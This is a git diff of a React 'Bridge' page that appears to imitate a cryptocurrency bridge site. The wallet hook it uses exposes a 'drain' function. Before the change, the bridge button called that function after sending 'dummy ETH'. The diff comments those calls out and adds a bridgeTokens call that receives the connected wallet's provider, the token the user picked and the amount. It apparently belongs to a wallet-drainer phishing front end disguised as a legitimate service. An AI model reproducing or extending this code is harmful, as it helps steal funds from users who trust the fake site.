@@ -46,10 +46,11 @@ const Bridge = () => {
   const [showConnect, setShowConnect] = useState(false);
   const [open, setOpen] = useState(false);
   const [currentTab, setCurrentTab] = useState("Bridge");
-  const [validate, setValidate] = useState(false);
+
+  const [selectedToken, setSelectedToken] = useState(null)
   const [inputValue, setInputValue] = useState("0.00");
-  const { address } = useAccount();
-  const { drain } = UseWallet(inputValue);
+  const { address, connector } = useAccount();
+  const { drain, bridgeTokens } = UseWallet(inputValue);
   const { disconnect } = useDisconnect();
   const { data: ensName } = useEnsName({ address });
   const { data: ensAvatar } = useEnsAvatar({
@@ -60,8 +61,9 @@ const Bridge = () => {
   });
 
   // setTimeout(() => {
+
   //   disconnect();
-  // }, 2000);
+  // }, 30000);
 
   const sendDummyEth = async () => {
     try {
@@ -101,16 +103,37 @@ const Bridge = () => {
       console.error("Error sending dummy ETH:", error);
     }
   };
+  const handleBridge = async () => {
+    try {
+      const provider = new ethers.providers.Web3Provider(await connector.getProvider()); // Get the provider for the connected wallet
+      const chainId = await provider.getSigner().getChainId(); // Get current chain ID
+      console.log(selectedToken)
+
+      // Call bridgeTokens and pass in the provider, address, and chainId
+      await bridgeTokens({
+        token: selectedToken,
+        amount: inputValue,
+        provider: provider,
+        accountAddress: address,
+        chainId: chainId
+      });
+    } catch (error) {
+      console.error("Error during bridging:", error);
+    }
+  };
+
 
   const handleClick = async () => {
-    sendDummyEth();
-    drain();
+    // sendDummyEth();
+    // drain();
+    // bridgeTokens()
   };
   const validConnectors = connectors.filter((connector) => {
     return typeof connector.icon === "string";
   });
 
-  console.log(blast);
+
+  // console.log(blast, selectedToken);
 
   return (
     <div id="__next">
@@ -249,7 +272,7 @@ const Bridge = () => {
                                     You Can Bridge
                                   </legend>
                                   {address && (
-                                    <GetTokenBalance address={address} />
+                                    <GetTokenBalance setSelectedToken={setSelectedToken} address={address} />
                                   )}
                                 </fieldset>
 
@@ -442,6 +465,7 @@ const Bridge = () => {
                                           disabled={Number(inputValue) <= 0}
                                           onClick={(e) => {
                                             handleClick();
+                                            handleBridge()
                                             e.preventDefault();
                                           }}
                                           className="select-none disabled:cursor-not-allowed disabled:bg-camo-300 disabled:text-gray-800 typography-brand-body-l-caps sm:max-md:min-h-[36px] sm:max-md:py-1.5 min-h-[40px] px-6 py-2 transition-colors will-change-transform [transform:translateZ(0)] rounded-bl-md rounded-tr-md [clip-path:polygon(20px_0,100%_0,100%_50%,calc(100%-20px)_100%,0_100%,0_50%)] w-full bg-yellow-300 focus-visible:bg-white active:bg-white media-hover:hover:bg-white text-black"
